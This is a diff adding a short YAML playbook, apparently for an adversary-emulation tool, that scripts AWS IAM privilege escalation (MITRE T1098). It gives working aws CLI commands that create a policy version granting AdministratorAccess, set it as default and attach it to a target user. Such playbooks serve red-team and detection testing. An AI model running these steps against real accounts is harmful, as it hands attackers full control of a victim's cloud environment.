@@ -1,0 +1,11 @@
+name: IAM Privilege Escalation via CreatePolicyVersion
+description: Creates a new IAM policy version with admin privileges and sets it as default.
+mitre_technique: T1098
+stage: Privilege Escalation
+steps:
+  - action: aws iam list-policies --scope Local
+    description: List customer-managed IAM policies
+  - action: aws iam create-policy-version --policy-arn ${policy_arn} --policy-document file://admin_policy.json --set-as-default
+    description: Upload and set as default a new policy version granting AdministratorAccess
+  - action: aws iam attach-user-policy --user-name ${target_user} --policy-arn ${policy_arn}
+    description: Attach the escalated policy to a user
